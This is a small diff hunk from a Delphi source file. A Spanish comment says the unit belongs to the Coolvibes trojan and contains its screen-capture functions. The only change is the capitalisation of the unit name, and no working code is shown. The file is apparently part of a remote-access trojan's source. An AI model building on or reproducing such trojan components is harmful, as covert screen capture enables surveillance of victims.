@@ -1,6 +1,6 @@
 {Unit perteneciente al troyano Coolvibes que contiene todas las funciones
 que son usadas en la captura de pantalla}
-unit unitCapScreen;
+unit UnitCapScreen;
 
 interface
 
